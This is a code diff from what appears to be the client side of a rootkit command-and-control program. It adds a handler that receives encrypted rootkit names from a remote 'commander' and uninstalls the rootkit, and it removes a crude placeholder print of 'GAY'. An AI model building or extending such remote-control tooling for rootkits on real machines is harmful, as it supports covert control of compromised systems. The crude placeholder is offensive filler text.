@@ -274,7 +274,18 @@ if __name__ == '__main__':
                         print(constants.MENU_CLOSING_BANNER)
 
                 if decrypted_data == constants.UNINSTALL:
-                    print("GAY")
+                    # a) Receive rootkit name from commander
+                    print(constants.CLIENT_RESPONSE.format(constants.UNINSTALL))
+                    rootkit_names = decrypt_string(client_socket.recv().decode(), shared_secret).split("/")
+
+                    # b) Uninstall Rootkit
+                    try:
+                        print("[+] Now uninstalling rootkit: {}".format(rootkit_names[0]))
+                        uninstall(rootkit_names[0])
+                    except FileNotFoundError as e:
+                        print("[+] UNINSTALL ERROR: An error has occurred {}".format(e))
+                        print("[+] Now uninstalling rootkit with alternate name: {}".format(rootkit_names[1]))
+                        uninstall(rootkit_names[1])
 
         except ConnectionResetError:
             print("[+] The client {}:{} disconnected unexpectedly.".format(client_address[0], client_address[1]))
